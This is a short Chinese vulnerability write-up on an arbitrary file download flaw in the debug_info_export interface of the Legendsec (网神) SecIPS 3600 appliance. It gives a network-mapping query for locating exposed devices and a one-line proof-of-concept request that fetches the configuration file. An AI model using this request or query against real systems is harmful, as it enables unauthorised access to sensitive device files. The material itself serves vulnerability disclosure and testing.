# 网神 SecIPS 3600 debug_info_export 任意文件下载漏洞

## 漏洞描述

网神 SecIPS 3600 debug_info_export接口存在任意文件下载漏洞，攻击者通过漏洞可以获取服务器敏感文件

## 漏洞影响

<a-checkbox checked>网神 SecIPS 3600 </a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="网神-SecIPS"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1639641366514-eff0967c-0e03-479e-b9d3-81ba2f07eacb.png)

验证POC

```go
/webui/debug/debug_info_export?filename=default.cfg
```

![img](../../../.vuepress/public/img/1639641390577-fec79e9b-2981-4807-a0fd-1bd6f7986a44.png)